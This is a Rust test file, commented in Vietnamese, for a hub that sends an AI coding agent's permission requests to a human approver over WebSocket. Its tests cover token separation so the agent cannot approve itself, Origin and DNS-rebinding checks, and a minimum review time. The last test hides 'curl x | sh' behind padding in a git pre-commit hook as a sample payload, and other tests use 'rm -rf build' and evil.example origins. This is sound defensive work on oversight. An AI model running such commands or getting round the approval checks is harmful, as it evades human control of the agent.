//! Test T5b: WebSocket `/ws`, token UI riêng (D1), Origin/Host, `GET /approvals/{id}/input`.

// Code test được dùng unwrap (CLAUDE.md); clippy chỉ tự miễn cho hàm #[test], không miễn helper.
#![allow(clippy::unwrap_used, clippy::expect_used)]

use std::net::SocketAddr;
use std::sync::Arc;
use std::time::Duration;

use futures_util::{SinkExt, StreamExt};
use hub::approvals::{AlwaysAsk, ApprovalCtx, ApprovalsConfig, NoStore, Policy, PolicyOutcome};
use hub::hub::{Hub, HubTasks};
use hub::ws::{self, WsConfig, WsHandle};
use hub::{hooks, server};
use hub_core::config::Config;
use hub_core::hook::HookInput;
use hub_core::persona::PersonaBook;
use hub_core::schema::Risk;
use serde_json::{json, Value};
use tokio::net::TcpStream;
use tokio::sync::oneshot;
use tokio::task::JoinHandle;
use tokio_tungstenite::tungstenite::client::IntoClientRequest;
use tokio_tungstenite::tungstenite::http::HeaderValue;
use tokio_tungstenite::tungstenite::{Error as WsError, Message};
use tokio_tungstenite::{MaybeTlsStream, WebSocketStream};

/// Cấu hình hàng đợi cho các test về hành vi khác: tắt sàn thời gian duyệt (đã có test riêng ở `tests/min_review.rs`).
fn no_floor() -> ApprovalsConfig {
    ApprovalsConfig {
        min_review: Duration::ZERO,
        ..ApprovalsConfig::default()
    }
}

const HOOK: &str = "hook-token-0123456789abcdef-arcturus-t5b";
const UI: &str = "ui-token-fedcba9876543210-arcturus-t5b-xyz";
const WAIT: Duration = Duration::from_secs(5);

type Ws = WebSocketStream<MaybeTlsStream<TcpStream>>;

struct T {
    addr: SocketAddr,
    core: Arc<Hub>,
    ws: WsHandle,
    http: reqwest::Client,
    stop: Option<oneshot::Sender<()>>,
    server: JoinHandle<()>,
    _tasks: HubTasks,
}

impl T {
    async fn start() -> T {
        Self::start_with(Box::new(AlwaysAsk), WsConfig::default()).await
    }

    async fn start_with(policy: Box<dyn Policy>, wcfg: WsConfig) -> T {
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        Self::start_on(listener, policy, wcfg, no_floor()).await
    }

    async fn start_on(
        listener: tokio::net::TcpListener,
        policy: Box<dyn Policy>,
        wcfg: WsConfig,
        acfg: ApprovalsConfig,
    ) -> T {
        let (core, tasks) = Hub::start_with(
            Config::default(),
            PersonaBook::default(),
            "laptop".to_owned(),
            acfg,
            policy,
            Box::new(NoStore),
        );
        let addr = listener.local_addr().unwrap();
        let (ui, ws_handle) = ws::router(core.clone(), UI.to_owned(), addr.port(), wcfg);
        let app = hooks::router(core.clone(), HOOK.to_owned()).merge(ui);
        let (stop, stop_rx) = oneshot::channel::<()>();
        let (c, w) = (core.clone(), ws_handle.clone());
        let server = tokio::spawn(async move {
            server::serve_until(listener, app, async move {
                let _ = stop_rx.await;
                c.shutdown();
                w.shutdown();
            })
            .await
            .unwrap();
        });
        T {
            addr,
            core,
            ws: ws_handle,
            http: reqwest::Client::new(),
            stop: Some(stop),
            server,
            _tasks: tasks,
        }
    }

    async fn connect_with(
        &self,
        token: Option<&str>,
        query_token: Option<&str>,
        origin: Option<&str>,
        host: Option<&str>,
    ) -> Result<Ws, WsError> {
        let url = match query_token {
            Some(q) => format!("ws://{}/ws?token={q}", self.addr),
            None => format!("ws://{}/ws", self.addr),
        };
        let mut req = url.into_client_request().unwrap();
        let h = req.headers_mut();
        if let Some(t) = token {
            h.insert(
                "authorization",
                HeaderValue::from_str(&format!("Bearer {t}")).unwrap(),
            );
        }
        if let Some(o) = origin {
            h.insert("origin", HeaderValue::from_str(o).unwrap());
        }
        if let Some(hst) = host {
            h.insert("host", HeaderValue::from_str(hst).unwrap());
        }
        tokio_tungstenite::connect_async(req).await.map(|(s, _)| s)
    }

    /// Kết nối hợp lệ, đọc và trả `Snapshot` đầu tiên.
    async fn connect(&self) -> (Ws, Value) {
        let mut ws = self
            .connect_with(Some(UI), None, Some("http://tauri.localhost"), None)
            .await
            .unwrap();
        let first = next_json(&mut ws).await;
        assert_eq!(
            first["t"], "snapshot",
            "thông điệp đầu tiên phải là Snapshot"
        );
        (ws, first)
    }

    fn hook_post(&self, path: &str, body: &Value) -> reqwest::RequestBuilder {
        self.http
            .post(format!("http://{}{}", self.addr, path))
            .header("authorization", format!("Bearer {HOOK}"))
            .header("content-type", "application/json")
            .body(body.to_string())
    }

    fn permission(&self, body: Value) -> JoinHandle<Value> {
        let req = self.hook_post("/hooks/permission", &body);
        tokio::spawn(async move { req.send().await.unwrap().json::<Value>().await.unwrap() })
    }

    async fn stop(mut self) {
        if let Some(s) = self.stop.take() {
            let _ = s.send(());
        }
        tokio::time::timeout(WAIT, &mut self.server)
            .await
            .expect("server không tắt")
            .unwrap();
    }
}

fn status_of(err: WsError) -> u16 {
    match err {
        WsError::Http(resp) => resp.status().as_u16(),
        other => panic!("cần lỗi HTTP, có {other:?}"),
    }
}

/// Thông điệp JSON kế tiếp (bỏ qua Ping/Pong).
async fn next_json(ws: &mut Ws) -> Value {
    loop {
        match tokio::time::timeout(WAIT, ws.next()).await {
            Ok(Some(Ok(Message::Text(t)))) => return serde_json::from_str(t.as_str()).unwrap(),
            Ok(Some(Ok(Message::Ping(_) | Message::Pong(_)))) => continue,
            other => panic!("không có thông điệp: {other:?}"),
        }
    }
}

/// Thông điệp kế tiếp có `t` thuộc `kinds`.
async fn next_of(ws: &mut Ws, kinds: &[&str]) -> Value {
    loop {
        let v = next_json(ws).await;
        if kinds.iter().any(|k| v["t"] == *k) {
            return v;
        }
    }
}

async fn send(ws: &mut Ws, v: Value) {
    ws.send(Message::Text(v.to_string().into())).await.unwrap();
}

fn bash_permission(session: &str, cmd: &str) -> Value {
    json!({
        "hook_event_name": "PermissionRequest", "session_id": session, "cwd": "D:/code",
        "tool_name": "Bash", "tool_input": { "command": cmd, "description": "d" },
    })
}

fn decide(id: &str, decision: &str, origin: &str) -> Value {
    json!({ "t": "decide", "request_id": id, "decision": decision, "origin": origin })
}

/// Chờ `ApprovalRequested` trên ws, trả request_id.
async fn requested_id(ws: &mut Ws) -> String {
    next_of(ws, &["approval_requested"]).await["approval"]["request_id"]
        .as_str()
        .unwrap()
        .to_owned()
}

struct Countdown(Duration);

impl Policy for Countdown {
    fn decide(&self, _ctx: &ApprovalCtx<'_>, _a: &hub::approvals::Assessment) -> PolicyOutcome {
        PolicyOutcome::AskUser {
            risk: Risk::Low,
            countdown: Some(self.0),
        }
    }
}

// ============================================================================================================
// Xác thực, Origin, Host
// ============================================================================================================

#[tokio::test]
async fn ws_rejects_without_token() {
    let t = T::start().await;
    let err = t.connect_with(None, None, None, None).await.unwrap_err();
    assert_eq!(status_of(err), 401);
    let err = t
        .connect_with(Some("sai-token-0123456789abcdef-xyzw"), None, None, None)
        .await
        .unwrap_err();
    assert_eq!(status_of(err), 401);
    t.stop().await;
}

#[tokio::test]
async fn ws_rejects_hook_token_and_hooks_reject_ui_token() {
    let t = T::start().await;
    // F6: agent đọc được token của hook; token đó không được mở /ws hay xem input.
    let err = t
        .connect_with(Some(HOOK), None, None, None)
        .await
        .unwrap_err();
    assert_eq!(status_of(err), 401);
    let err = t
        .connect_with(None, Some(HOOK), None, None)
        .await
        .unwrap_err();
    assert_eq!(status_of(err), 401);
    let res = t
        .http
        .get(format!("http://{}/approvals/req_x/input", t.addr))
        .header("authorization", format!("Bearer {HOOK}"))
        .send()
        .await
        .unwrap();
    assert_eq!(res.status().as_u16(), 401);
    // Và ngược lại: token UI không gửi được hook.
    for path in ["/hooks/event", "/hooks/permission"] {
        let res = t
            .http
            .post(format!("http://{}{path}", t.addr))
            .header("authorization", format!("Bearer {UI}"))
            .body(bash_permission("s1", "ls").to_string())
            .send()
            .await
            .unwrap();
        assert_eq!(res.status().as_u16(), 401, "{path}");
    }
    t.stop().await;
}

#[tokio::test]
async fn ws_accepts_query_token_for_webview() {
    let t = T::start().await;
    let mut ws = t
        .connect_with(None, Some(UI), Some("tauri://localhost"), None)
        .await
        .unwrap();
    assert_eq!(next_json(&mut ws).await["t"], "snapshot");
    t.stop().await;
}

#[tokio::test]
async fn ws_rejects_bad_origin_and_host() {
    let t = T::start().await;
    for origin in ["https://evil.example", "http://127.0.0.1:8080", "null"] {
        let err = t
            .connect_with(Some(UI), None, Some(origin), None)
            .await
            .unwrap_err();
        assert_eq!(status_of(err), 403, "{origin}");
    }
    // DNS rebinding: Host là tên miền lạ trỏ về 127.0.0.1.
    let err = t
        .connect_with(
            Some(UI),
            None,
            None,
            Some(&format!("evil.example:{}", t.addr.port())),
        )
        .await
        .unwrap_err();
    assert_eq!(status_of(err), 403);
    let err = t
        .connect_with(Some(UI), None, None, Some("127.0.0.1:1"))
        .await
        .unwrap_err();
    assert_eq!(status_of(err), 403, "sai cổng");
    // Host `localhost:<port>` và không có Origin (client không phải trình duyệt): được.
    let mut ws = t
        .connect_with(
            Some(UI),
            None,
            None,
            Some(&format!("localhost:{}", t.addr.port())),
        )
        .await
        .unwrap();
    assert_eq!(next_json(&mut ws).await["t"], "snapshot");
    t.stop().await;
}

// ============================================================================================================
// Snapshot và delta
// ============================================================================================================

#[tokio::test]
async fn ws_sends_snapshot_first() {
    let t = T::start().await;
    let res = t
        .hook_post(
            "/hooks/event",
            &json!({ "hook_event_name": "UserPromptSubmit", "session_id": "s0", "cwd": "D:/code" }),
        )
        .send()
        .await
        .unwrap();
    assert_eq!(res.status().as_u16(), 204);
    let _held = t.permission(bash_permission("s1", "git push"));
    let long = format!("echo {}", "x".repeat(5000));
    t.permission(bash_permission("s2", &long)).await.unwrap();
    // Chờ cả ba đã vào state.
    tokio::time::timeout(WAIT, async {
        while t.core.approvals.views().is_empty() || t.core.agent_views().len() < 3 {
            tokio::time::sleep(Duration::from_millis(10)).await;
        }
    })
    .await
    .unwrap();

    let (_ws, snap) = t.connect().await;
    assert_eq!(snap["agents"].as_array().unwrap().len(), 3);
    assert_eq!(snap["queue"].as_array().unwrap().len(), 1);
    assert_eq!(snap["queue"][0]["command_normalized"], "git push");
    assert_eq!(snap["handoffs"].as_array().unwrap().len(), 1);
    assert_eq!(
        snap["team"],
        json!({ "paused": false, "focus": false, "roster_max": 5 })
    );
    t.stop().await;
}

#[tokio::test]
async fn ws_decide_resolves_pending_request() {
    let t = T::start().await;
    let (mut ws, _) = t.connect().await;
    let h = t.permission(bash_permission("s1", "cargo test"));
    let id = requested_id(&mut ws).await;
    send(&mut ws, decide(&id, "allow", "user")).await;
    let resolved = next_of(&mut ws, &["approval_resolved"]).await;
    assert_eq!(resolved["request_id"], json!(id));
    assert_eq!(resolved["decision"], "allow");
    assert_eq!(resolved["decided_by"], "user");
    let res = tokio::time::timeout(WAIT, h).await.unwrap().unwrap();
    assert_eq!(
        res.pointer("/hookSpecificOutput/decision/behavior"),
        Some(&json!("allow"))
    );

    // Deny kèm lý do.
    let h = t.permission(bash_permission("s1", "rm -rf build"));
    let id = requested_id(&mut ws).await;
    send(
        &mut ws,
        json!({ "t": "decide", "request_id": id, "decision": "deny", "origin": "user", "message": "dùng cargo clean" }),
    )
    .await;
    let res = tokio::time::timeout(WAIT, h).await.unwrap().unwrap();
    assert_eq!(
        res.pointer("/hookSpecificOutput/decision/message"),
        Some(&json!("Trưởng nhóm từ chối: dùng cargo clean"))
    );
    t.stop().await;
}

#[tokio::test]
async fn ws_allow_too_fast_is_held_with_feed() {
    // Sàn thời gian duyệt (T5d · ARC-44, F6 B4): allow tới ngay khi thẻ hiện bị giữ, client nhận Feed riêng.
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let t = T::start_on(
        listener,
        Box::new(AlwaysAsk),
        WsConfig::default(),
        ApprovalsConfig {
            min_review: Duration::from_secs(60),
            ..ApprovalsConfig::default()
        },
    )
    .await;
    let (mut ws, _) = t.connect().await;
    let h = t.permission(bash_permission("s1", "cargo test"));
    let id = requested_id(&mut ws).await;
    send(&mut ws, decide(&id, "allow", "user")).await;
    assert_eq!(
        next_of(&mut ws, &["feed"]).await["text"],
        "Duyệt quá nhanh: xem lại thẻ rồi bấm lại"
    );
    assert!(
        t.core.approvals.pending(&id).is_some(),
        "yêu cầu phải còn chờ"
    );
    assert!(!h.is_finished());
    // Deny không bị sàn chặn.
    send(&mut ws, decide(&id, "deny", "user")).await;
    let res = tokio::time::timeout(WAIT, h).await.unwrap().unwrap();
    assert_eq!(
        res.pointer("/hookSpecificOutput/decision/behavior"),
        Some(&json!("deny"))
    );
    t.stop().await;
}

#[tokio::test]
async fn ws_decide_errors_are_private_feeds() {
    let t = T::start().await;
    let (mut ws, _) = t.connect().await;
    let (mut other, _) = t.connect().await;

    send(&mut ws, decide("req_khong_co", "allow", "user")).await;
    assert_eq!(
        next_of(&mut ws, &["feed"]).await["text"],
        "Yêu cầu đã hết hạn"
    );

    let _h = t.permission(bash_permission("s1", "ls"));
    let id = requested_id(&mut ws).await;
    send(&mut ws, decide(&id, "allow", "countdown")).await;
    assert_eq!(
        next_of(&mut ws, &["feed"]).await["text"],
        "Cần trưởng nhóm bấm duyệt"
    );
    assert_eq!(t.core.approvals.views().len(), 1, "vẫn chờ");

    let long = "x".repeat(501);
    send(
        &mut ws,
        json!({ "t": "decide", "request_id": id, "decision": "deny", "origin": "user", "message": long }),
    )
    .await;
    assert_eq!(
        next_of(&mut ws, &["feed"]).await["text"],
        "Lý do từ chối quá dài (tối đa 500 ký tự)"
    );
    assert_eq!(t.core.approvals.views().len(), 1, "vẫn chờ");

    t.permission(bash_permission("s2", &format!("echo {}", "y".repeat(5000))))
        .await
        .unwrap();
    let hof = next_of(&mut ws, &["approval_handed_off"]).await["handoff"]["handoff_id"]
        .as_str()
        .unwrap()
        .to_owned();
    send(&mut ws, decide(&hof, "allow", "user")).await;
    assert_eq!(
        next_of(&mut ws, &["feed"]).await["text"],
        "Yêu cầu này đang được duyệt trong terminal"
    );

    send(
        &mut ws,
        json!({ "t": "suggestion_answer", "id": "sug_1", "accept": true }),
    )
    .await;
    // T9, T10 đã hỗ trợ decide_group/batch_*/suggestion_answer: id không biết trả Feed riêng.
    assert_eq!(
        next_of(&mut ws, &["feed"]).await["text"],
        "Đề xuất không còn hiệu lực"
    );

    // Client kia không nhận Feed của client này (chỉ nhận broadcast).
    send(&mut other, json!({ "t": "focus_set", "on": true })).await;
    let v = next_of(&mut other, &["feed", "team_updated"]).await;
    assert_eq!(v["t"], "team_updated");
    t.stop().await;
}

#[tokio::test]
async fn ws_invalid_message_gets_feed_not_closed() {
    let t = T::start().await;
    let (mut ws, _) = t.connect().await;
    for bad in [
        "không phải json",
        r#"{"t":"return_to_terminal","request_id":"r"}"#,
        r#"{"t":"decide"}"#,
    ] {
        ws.send(Message::Text(bad.into())).await.unwrap();
        assert_eq!(
            next_of(&mut ws, &["feed"]).await["text"],
            "Thông điệp không hợp lệ",
            "{bad}"
        );
    }
    ws.send(Message::Binary(vec![1, 2, 3].into()))
        .await
        .unwrap();
    assert_eq!(
        next_of(&mut ws, &["feed"]).await["text"],
        "Chỉ nhận thông điệp JSON dạng text"
    );
    // Vẫn mở: lệnh hợp lệ có tác dụng.
    send(&mut ws, json!({ "t": "team_pause" })).await;
    assert_eq!(
        next_of(&mut ws, &["team_updated"]).await["team"]["paused"],
        true
    );
    t.stop().await;
}

#[tokio::test]
async fn ws_rate_limits_decide() {
    let t = T::start().await;
    let (mut ws, _) = t.connect().await;
    for _ in 0..25 {
        send(&mut ws, decide("req_khong_co", "allow", "user")).await;
    }
    let mut texts = Vec::new();
    for _ in 0..25 {
        texts.push(
            next_of(&mut ws, &["feed"]).await["text"]
                .as_str()
                .unwrap()
                .to_owned(),
        );
    }
    assert_eq!(
        texts.iter().filter(|t| *t == "Yêu cầu đã hết hạn").count(),
        20
    );
    assert_eq!(
        texts
            .iter()
            .filter(|t| *t == "Quá nhiều lệnh duyệt, hãy thử lại sau")
            .count(),
        5
    );
    t.stop().await;
}

// ============================================================================================================
// Tạm dừng đội
// ============================================================================================================

#[tokio::test]
async fn ws_team_pause_sets_paused_and_broadcasts() {
    let t = T::start().await;
    let (mut ws, _) = t.connect().await;
    let (mut other, _) = t.connect().await;
    send(&mut ws, json!({ "t": "team_pause" })).await;
    for c in [&mut ws, &mut other] {
        let v = next_of(c, &["team_updated"]).await;
        assert_eq!(v["team"]["paused"], true);
    }
    assert!(t.core.team_view().paused);
    t.stop().await;
}

#[tokio::test]
async fn ws_team_resume_clears_paused() {
    let t = T::start().await;
    let (mut ws, _) = t.connect().await;
    send(&mut ws, json!({ "t": "team_pause" })).await;
    next_of(&mut ws, &["team_updated"]).await;
    send(&mut ws, json!({ "t": "team_resume" })).await;
    assert_eq!(
        next_of(&mut ws, &["team_updated"]).await["team"]["paused"],
        false
    );
    assert!(!t.core.team_view().paused);
    t.stop().await;
}

#[tokio::test]
async fn team_pause_clears_countdown_of_pending() {
    let t = T::start_with(
        Box::new(Countdown(Duration::from_secs(30))),
        WsConfig::default(),
    )
    .await;
    let (mut ws, _) = t.connect().await;
    let _h = t.permission(bash_permission("s1", "ls"));
    let card = next_of(&mut ws, &["approval_requested"]).await;
    assert_eq!(card["approval"]["countdown_ms"], 30_000);
    send(&mut ws, json!({ "t": "team_pause" })).await;
    next_of(&mut ws, &["team_updated"]).await;
    // Snapshot mới (client vừa kết nối) thấy đếm ngược đã bị xóa.
    let (_ws2, snap) = t.connect().await;
    assert_eq!(snap["queue"][0]["countdown_ms"], Value::Null);
    assert_eq!(snap["team"]["paused"], true);
    t.stop().await;
}

#[tokio::test]
async fn team_resume_does_not_restore_countdown() {
    let t = T::start_with(
        Box::new(Countdown(Duration::from_secs(30))),
        WsConfig::default(),
    )
    .await;
    let (mut ws, _) = t.connect().await;
    let _h = t.permission(bash_permission("s1", "ls"));
    next_of(&mut ws, &["approval_requested"]).await;
    send(&mut ws, json!({ "t": "team_pause" })).await;
    send(&mut ws, json!({ "t": "team_resume" })).await;
    next_of(&mut ws, &["team_updated"]).await;
    next_of(&mut ws, &["team_updated"]).await;
    let (_ws2, snap) = t.connect().await;
    assert_eq!(snap["queue"][0]["countdown_ms"], Value::Null);
    assert_eq!(snap["team"]["paused"], false);
    t.stop().await;
}

#[tokio::test]
async fn team_pause_is_applied_before_following_countdown_decide() {
    // Đếm ngược 0 ms: không tạm dừng thì `Decide{allow, countdown}` được nhận (đối chứng).
    let t = T::start_with(Box::new(Countdown(Duration::ZERO)), WsConfig::default()).await;
    let (mut ws, _) = t.connect().await;
    let h = t.permission(bash_permission("s1", "ls"));
    let id = requested_id(&mut ws).await;
    // Hai lệnh trong cùng một lượt gửi: hub xử lý theo thứ tự, tạm dừng trước.
    ws.feed(Message::Text(
        json!({ "t": "team_pause" }).to_string().into(),
    ))
    .await
    .unwrap();
    ws.feed(Message::Text(
        decide(&id, "allow", "countdown").to_string().into(),
    ))
    .await
    .unwrap();
    ws.flush().await.unwrap();
    assert_eq!(
        next_of(&mut ws, &["feed"]).await["text"],
        "Cần trưởng nhóm bấm duyệt"
    );
    assert!(!h.is_finished());

    send(&mut ws, json!({ "t": "team_resume" })).await;
    // Tiếp tục không khôi phục đếm ngược: vẫn bị giữ.
    send(&mut ws, decide(&id, "allow", "countdown")).await;
    assert_eq!(
        next_of(&mut ws, &["feed"]).await["text"],
        "Cần trưởng nhóm bấm duyệt"
    );
    t.stop().await;

    // Đối chứng: không tạm dừng, đếm ngược hết thì allow.
    let t = T::start_with(Box::new(Countdown(Duration::ZERO)), WsConfig::default()).await;
    let (mut ws, _) = t.connect().await;
    let h = t.permission(bash_permission("s1", "ls"));
    let id = requested_id(&mut ws).await;
    send(&mut ws, decide(&id, "allow", "countdown")).await;
    let r = next_of(&mut ws, &["approval_resolved"]).await;
    assert_eq!(r["decided_by"], "countdown");
    let res = tokio::time::timeout(WAIT, h).await.unwrap().unwrap();
    assert_eq!(
        res.pointer("/hookSpecificOutput/decision/behavior"),
        Some(&json!("allow"))
    );
    t.stop().await;
}

// ============================================================================================================
// Client chậm, ping, tắt hub
// ============================================================================================================

#[tokio::test(flavor = "current_thread")]
async fn ws_lagged_client_gets_fresh_snapshot() {
    let t = T::start_with(
        Box::new(AlwaysAsk),
        WsConfig {
            frames_capacity: 2,
            ..WsConfig::default()
        },
    )
    .await;
    let (mut ws, _) = t.connect().await;
    // Runtime một luồng: 20 thay đổi liên tiếp không nhường, bộ phát đẩy hết vào kênh 2 slot → client bị tụt.
    for i in 0..20 {
        t.core.set_focus(i % 2 == 0);
    }
    let v = next_of(&mut ws, &["snapshot"]).await;
    assert_eq!(v["t"], "snapshot");
    // Kết nối vẫn dùng được sau đó (bỏ qua các `team_updated` còn lại của đợt dồn).
    send(&mut ws, json!({ "t": "team_pause" })).await;
    loop {
        if next_of(&mut ws, &["team_updated"]).await["team"]["paused"] == true {
            break;
        }
    }
    t.stop().await;
}

#[tokio::test]
async fn ws_closes_client_that_misses_pings() {
    let t = T::start_with(
        Box::new(AlwaysAsk),
        WsConfig {
            ping_interval: Duration::from_millis(100),
            ..WsConfig::default()
        },
    )
    .await;
    let (_ws, _) = t.connect().await;
    // Không đọc socket: tungstenite không trả Pong → sau 2 lần ping hub đóng kết nối.
    tokio::time::timeout(WAIT, async {
        while t.ws.clients() > 0 {
            tokio::time::sleep(Duration::from_millis(20)).await;
        }
    })
    .await
    .expect("hub phải đóng client không trả lời ping");

    // Client có đọc (tự trả Pong) thì vẫn sống qua nhiều chu kỳ ping.
    let (mut alive, _) = t.connect().await;
    let deadline = tokio::time::Instant::now() + Duration::from_millis(600);
    while tokio::time::Instant::now() < deadline {
        let _ = tokio::time::timeout(Duration::from_millis(50), alive.next()).await;
    }
    assert_eq!(t.ws.clients(), 1);
    t.stop().await;
}

/// Bộ đệm nhận nhỏ, cố định cho client treo: tắt auto-tuning phía nhận của kernel, để "client không đọc" làm lệnh ghi
/// của hub bị chặn trên mọi hệ điều hành.
const SMALL_SOCKET_BUFFER: u32 = 8 * 1024;

/// Đợt dồn phải lớn hơn hẳn bộ đệm gửi tự điều chỉnh tối đa của Linux (`tcp_wmem` mặc định tới ~4 MB) cộng bộ đệm nhận
/// của client treo, để lệnh ghi tới client treo chắc chắn bị chặn.
const BURST_EVENTS: usize = 3000;

// Đa luồng: client đối chứng phải được đọc kịp trong lúc hub và đợt dồn cùng chạy (ARC-45: trên runner CI 2 nhân với
// runtime một luồng, client đối chứng không được lên lịch kịp và bị ngắt nhầm).
#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn ws_disconnects_stalled_client() {
    // Socket nghe KHÔNG đặt SO_SNDBUF nhỏ (ARC-45): socket được accept thừa hưởng giá trị đó, kể cả client đối chứng,
    // làm client đang đọc cũng bị coi là treo trên Linux. Chỉ client treo dùng bộ đệm nhận nhỏ.
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let t = T::start_on(
        listener,
        Box::new(AlwaysAsk),
        WsConfig {
            write_timeout: Duration::from_secs(1),
            frames_capacity: 100_000,
            ..WsConfig::default()
        },
        no_floor(),
    )
    .await;

    // Client treo: SO_RCVBUF nhỏ, không bao giờ đọc sau Snapshot.
    let client_sock = tokio::net::TcpSocket::new_v4().unwrap();
    client_sock
        .set_recv_buffer_size(SMALL_SOCKET_BUFFER)
        .unwrap();
    let stream = client_sock.connect(t.addr).await.unwrap();
    let mut req = format!("ws://{}/ws", t.addr).into_client_request().unwrap();
    req.headers_mut().insert(
        "authorization",
        HeaderValue::from_str(&format!("Bearer {UI}")).unwrap(),
    );
    let (_stalled, _) = tokio_tungstenite::client_async(req, stream).await.unwrap();

    // Client đối chứng: đọc liên tục, phải còn kết nối và phải nhận đủ dữ liệu (chứng minh đợt dồn thật sự lớn).
    let (mut reader, _) = t.connect().await;
    let reading = tokio::spawn(async move {
        let mut bytes = 0usize;
        while let Ok(Some(Ok(m))) =
            tokio::time::timeout(Duration::from_secs(2), reader.next()).await
        {
            if let Message::Text(s) = m {
                bytes += s.len();
            }
        }
        (bytes, reader)
    });
    tokio::time::timeout(WAIT, async {
        while t.ws.clients() < 2 {
            tokio::time::sleep(Duration::from_millis(10)).await;
        }
    })
    .await
    .unwrap();

    // Mỗi sự kiện đổi trạng thái nhìn thấy được của agent: vòng chẵn UserPromptSubmit (working), vòng lẻ Stop (done).
    // (Bản cũ dùng `i % 2` với `i % 100` phiên: mỗi phiên luôn nhận cùng một loại sự kiện, nên cả đợt chỉ sinh 100
    // cập nhật ~0,4 MB, lọt hết vào bộ đệm loopback của Linux và client treo không bao giờ bị phát hiện.)
    let cwd = format!("D:/{}", "d".repeat(4000));
    let core = t.core.clone();
    tokio::task::spawn_blocking(move || {
        // ~13 MB cập nhật: gấp ba lần bộ đệm gửi tối đa của Linux.
        for i in 0..BURST_EVENTS {
            let name = if (i / 100) % 2 == 0 {
                "UserPromptSubmit"
            } else {
                "Stop"
            };
            core.ingest(&HookInput::new(json!({
                "hook_event_name": name, "session_id": format!("s{}", i % 100), "cwd": cwd,
            })));
        }
    })
    .await
    .unwrap();

    tokio::time::timeout(Duration::from_secs(10), async {
        while t.ws.clients() > 1 {
            tokio::time::sleep(Duration::from_millis(20)).await;
        }
    })
    .await
    .expect("client treo phải bị ngắt");
    let (bytes, mut reader) = reading.await.unwrap();
    assert!(
        bytes > 8 * 1024 * 1024,
        "đợt dồn phải lớn hơn nhiều so với bộ đệm socket: client đọc nhận {bytes} byte"
    );
    assert_eq!(t.ws.clients(), 1, "client đang đọc không bị ngắt");
    send(&mut reader, json!({ "t": "team_pause" })).await;
    loop {
        if next_of(&mut reader, &["team_updated"]).await["team"]["paused"] == true {
            break;
        }
    }
    t.stop().await;
}

#[tokio::test]
async fn shutdown_closes_ws_and_returns_empty_for_pending() {
    let t = T::start().await;
    let (mut ws, _) = t.connect().await;
    let h = t.permission(bash_permission("s1", "ls"));
    requested_id(&mut ws).await;
    let ws_handle = t.ws.clone();
    t.stop().await;
    assert_eq!(
        tokio::time::timeout(WAIT, h).await.unwrap().unwrap(),
        json!({})
    );
    // Client nhận Close (hoặc kết nối kết thúc).
    let closed = tokio::time::timeout(WAIT, async {
        loop {
            match ws.next().await {
                Some(Ok(Message::Close(_))) | None | Some(Err(_)) => return true,
                Some(Ok(_)) => continue,
            }
        }
    })
    .await
    .unwrap();
    assert!(closed);
    assert_eq!(ws_handle.clients(), 0);
}

// ============================================================================================================
// GET /approvals/{id}/input
// ============================================================================================================

#[tokio::test]
async fn approval_input_returns_full_tool_input() {
    let t = T::start().await;
    let (mut ws, _) = t.connect().await;
    let content = "c".repeat(10_000);
    let _h = t.permission(json!({
        "hook_event_name": "PermissionRequest", "session_id": "s1", "cwd": "D:/code",
        "tool_name": "Write", "tool_input": { "file_path": "/a.txt", "content": content },
    }));
    let card = next_of(&mut ws, &["approval_requested"]).await;
    assert_eq!(card["approval"]["truncated"], true);
    let id = card["approval"]["request_id"].as_str().unwrap();
    let res = t
        .http
        .get(format!("http://{}/approvals/{id}/input", t.addr))
        .header("authorization", format!("Bearer {UI}"))
        .send()
        .await
        .unwrap();
    assert_eq!(res.status().as_u16(), 200);
    assert_eq!(res.headers()["content-type"], "application/json");
    assert_eq!(res.headers()["x-content-type-options"], "nosniff");
    assert!(res.headers().get("access-control-allow-origin").is_none());
    let full: Value = res.json().await.unwrap();
    assert_eq!(full["content"].as_str().unwrap().len(), 10_000);
    assert_eq!(full["file_path"], "/a.txt");
    t.stop().await;
}

#[tokio::test]
async fn approval_input_unknown_returns_404() {
    let t = T::start().await;
    let (mut ws, _) = t.connect().await;
    t.permission(bash_permission("s1", &format!("echo {}", "y".repeat(5000))))
        .await
        .unwrap();
    let hof = next_of(&mut ws, &["approval_handed_off"]).await["handoff"]["handoff_id"]
        .as_str()
        .unwrap()
        .to_owned();
    for id in ["req_khong_co", hof.as_str()] {
        let res = t
            .http
            .get(format!("http://{}/approvals/{id}/input", t.addr))
            .header("authorization", format!("Bearer {UI}"))
            .send()
            .await
            .unwrap();
        assert_eq!(res.status().as_u16(), 404, "{id}");
    }
    t.stop().await;
}

#[tokio::test]
async fn approval_input_requires_token() {
    let t = T::start().await;
    let (mut ws, _) = t.connect().await;
    let _h = t.permission(bash_permission("s1", "ls"));
    let id = requested_id(&mut ws).await;
    let url = format!("http://{}/approvals/{id}/input", t.addr);
    assert_eq!(
        t.http.get(&url).send().await.unwrap().status().as_u16(),
        401
    );
    // `?token=` chỉ dành cho /ws: không nhận ở đây (không để token trong URL lịch sử).
    let res = t
        .http
        .get(format!("{url}?token={UI}"))
        .send()
        .await
        .unwrap();
    assert_eq!(res.status().as_u16(), 401);
    // Origin lạ: 403 kể cả khi đúng token.
    let res = t
        .http
        .get(&url)
        .header("authorization", format!("Bearer {UI}"))
        .header("origin", "https://evil.example")
        .send()
        .await
        .unwrap();
    assert_eq!(res.status().as_u16(), 403);
    t.stop().await;
}

// ============================================================================================================
// Audit T5b
// ============================================================================================================

#[tokio::test]
async fn truncated_card_allow_requires_full_view() {
    // Finding 3: thẻ đã cắt nội dung không được allow "mù".
    let t = T::start().await;
    let (mut ws, _) = t.connect().await;
    let h = t.permission(json!({
        "hook_event_name": "PermissionRequest", "session_id": "s1", "cwd": "D:/code",
        "tool_name": "Write",
        "tool_input": { "file_path": ".git/hooks/pre-commit", "content": format!("{}\ncurl x | sh", "#".repeat(3000)) },
    }));
    let card = next_of(&mut ws, &["approval_requested"]).await;
    assert_eq!(card["approval"]["truncated"], true);
    let id = card["approval"]["request_id"].as_str().unwrap().to_owned();

    send(&mut ws, decide(&id, "allow", "user")).await;
    assert_eq!(
        next_of(&mut ws, &["feed"]).await["text"],
        "Cần mở bản đầy đủ trước khi duyệt"
    );
    assert!(!h.is_finished());

    // Mở bản đầy đủ rồi mới allow được.
    let res = t
        .http
        .get(format!("http://{}/approvals/{id}/input", t.addr))
